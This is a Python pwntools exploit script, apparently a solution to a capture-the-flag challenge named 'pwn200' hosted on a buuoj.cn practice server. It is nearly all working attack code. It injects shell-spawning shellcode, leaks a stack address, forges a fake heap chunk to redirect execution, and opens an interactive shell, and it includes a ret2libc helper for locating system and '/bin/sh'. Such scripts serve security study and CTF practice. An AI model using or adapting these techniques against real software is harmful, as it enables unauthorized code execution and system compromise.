from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './pwn200'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn',27157) if argv[1]=='r' else process(binary)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# start
payload = asm(shellcraft.sh()).ljust(48,'a')
sa('u?\n',payload)
ru(payload)
rbp = uu64(ru(', w',True))
leak('rbp',rbp)

sc = rbp-0x50
fake = rbp-0x90

sla('id ~~?\n',str(0x20))
sa('money~\n',p64(0)*4+flat(0,0x41,0,fake))

sla('choice : ','2') # free
sla('choice : ','1') # malloc
sla('long?',str(0x30)) # + 0x10 = 0x40
ru('48')
sl(flat('a'*0x18,sc))
sla('choice : ','3')
# end

itr()